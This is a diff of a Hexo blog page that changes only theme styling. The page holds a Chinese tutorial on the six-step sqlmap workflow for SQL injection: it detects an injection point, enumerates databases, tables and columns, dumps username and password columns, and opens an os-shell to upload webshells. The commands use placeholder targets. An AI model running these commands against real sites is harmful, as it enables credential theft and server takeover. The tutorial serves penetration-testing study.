@@ -17,7 +17,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"anchorety.github.io","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"anchorety.github.io","root":"/","scheme":"Pisces","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="​    前段时间一直在研究Webshell相关内容，涉及到使用sql注入进行getshell，因此准备对于sql注入过程做一个比较系统的总结，sql注入部分主要分为sqlmap6步法和手工注入法两部分，本文将主要针对sqlmap注入法进行介绍，手工注入法将在下一篇文章中进行介绍。 sqlmap注入6步法​    首先要进行介绍的就是sql注入到getshell的常见6步法，该方法涵盖了整个过程常">
@@ -229,33 +229,33 @@
         <p>​    前段时间一直在研究Webshell相关内容，涉及到使用sql注入进行getshell，因此准备对于sql注入过程做一个比较系统的总结，sql注入部分主要分为sqlmap6步法和手工注入法两部分，本文将主要针对sqlmap注入法进行介绍，手工注入法将在<a href>下一篇文章中进行介绍</a>。</p>
 <h3 id="sqlmap注入6步法"><a href="#sqlmap注入6步法" class="headerlink" title="sqlmap注入6步法"></a>sqlmap注入6步法</h3><p>​    首先要进行介绍的就是sql注入到getshell的常见6步法，该方法涵盖了整个过程常见的全部关键步骤。本文主要介绍使用sqlmap工具来进行sql注入的过程。</p>
 <p><strong>1.判定是否存在注入点</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 对提供的网址进行注入点测试   </span><br><span class="line">sqlmap -u http://xxx/id=??? --batch</span><br><span class="line">	--batch:表示全部需要人机交互的部分采用默认选项进行选择</span><br><span class="line">	--cookie: cookie为可选项，如果要使用登录的请求应该先使用brupsuite来进行抓包查看ccokie写入该参数</span><br><span class="line">	--r: post方式进行注入，先使用bp抓到完整的包，然后保存为一个文件，这里直接使用-r进行指定</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 对提供的网址进行注入点测试   </span></span><br><span class="line">sqlmap -u http://xxx/id=??? --batch</span><br><span class="line">	--batch:表示全部需要人机交互的部分采用默认选项进行选择</span><br><span class="line">	--cookie: cookie为可选项，如果要使用登录的请求应该先使用brupsuite来进行抓包查看ccokie写入该参数</span><br><span class="line">	--r: post方式进行注入，先使用bp抓到完整的包，然后保存为一个文件，这里直接使用-r进行指定</span><br></pre></td></tr></table></figure>
 <p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap注入点检测2.png?raw=true" alt></p>
 <p>输出结果：</p>
 <p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap注入点检测.png?raw=true" alt></p>
 <p><strong>2.数据库名获取</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 获取数据库名称</span><br><span class="line">sqlmap -u "http://xxx/id=???"   --current-db --batch</span><br><span class="line">	--cunrrent-db：进行数据库探测选项</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取数据库名称</span></span><br><span class="line">sqlmap -u "http://xxx/id=???"   --current-db --batch</span><br><span class="line">	--cunrrent-db：进行数据库探测选项</span><br></pre></td></tr></table></figure>
 <p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap数据库探测2.png?raw=true" alt></p>
 <p>输出结果：</p>
 <p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap数据探测.png?raw=true" alt></p>
 <p><strong>3.获取数据库中的表名</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 获取表名</span><br><span class="line">sqlmap -u "http://xxx/id=???"  --D 数据库名称 --tables --batch</span><br><span class="line">	-D：指定要探测数据库名称</span><br><span class="line">	--tables：进行表名探索选项</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取表名</span></span><br><span class="line">sqlmap -u "http://xxx/id=???"  --D 数据库名称 --tables --batch</span><br><span class="line">	-D：指定要探测数据库名称</span><br><span class="line">	--tables：进行表名探索选项</span><br></pre></td></tr></table></figure>
 <p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap数据表探测2.png?raw=true" alt></p>
 <p>输出结果：</p>
 <p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap数据表探测.png?raw=true" alt></p>
 <p><strong>4.对选定表的列名进行获取</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 获取表中字段名称</span><br><span class="line">sqlmap -u "http://xxx/id=???"  --D 数据库名称 --T 表名 --columns --batch</span><br><span class="line">	-D：指定要进行探索的表</span><br><span class="line">	-columns：进行字段名称探索选项</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取表中字段名称</span></span><br><span class="line">sqlmap -u "http://xxx/id=???"  --D 数据库名称 --T 表名 --columns --batch</span><br><span class="line">	-D：指定要进行探索的表</span><br><span class="line">	-columns：进行字段名称探索选项</span><br></pre></td></tr></table></figure>
 <p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap字段探测2.png?raw=true" alt></p>
 <p>输出结果：</p>
 <p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap字段探测.png?raw=true" alt></p>
 <p><strong>5.探测用户名密码</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 获取用户名和密码并保存到指定文件</span><br><span class="line">sqlmap -u "http://xxx/id=???"  --D 数据库名称 --T 表名 --C 用户名列名,密码列名 --dump</span><br><span class="line">	-C:指定选择的列名</span><br><span class="line">	--dump：将内容输出到文件</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取用户名和密码并保存到指定文件</span></span><br><span class="line">sqlmap -u "http://xxx/id=???"  --D 数据库名称 --T 表名 --C 用户名列名,密码列名 --dump</span><br><span class="line">	-C:指定选择的列名</span><br><span class="line">	--dump：将内容输出到文件</span><br></pre></td></tr></table></figure>
 <p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap用户名密码数据读取2.png?raw=true" alt></p>
 <p>输出结果：</p>
 <p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap用户名密码数据读取.png?raw=true" alt></p>
 <p><strong>6.获取shell</strong></p>
 <p>​    os-shell只是一个辅助上传大马、小马的辅助shell，可以使用也可以直接利用数据库备份功能人工上传大、小马不进行这一步。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 获取os-shell</span><br><span class="line">sqlmap -u "http://xxx/id=???" --os-shell</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取os-shell</span></span><br><span class="line">sqlmap -u "http://xxx/id=???" --os-shell</span><br></pre></td></tr></table></figure>
 <p>​    这里使用os-shell需要很高的权限才能成功使用。具体需要的权限包括：</p>
 <blockquote>
 <p>1.网站必须是root权限</p>
@@ -422,7 +422,7 @@
   <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.7.1
   </div>
   <span class="post-meta-divider">|</span>
-  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.2
+  <div class="theme-info">Theme – <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.7.2
   </div>
 
         
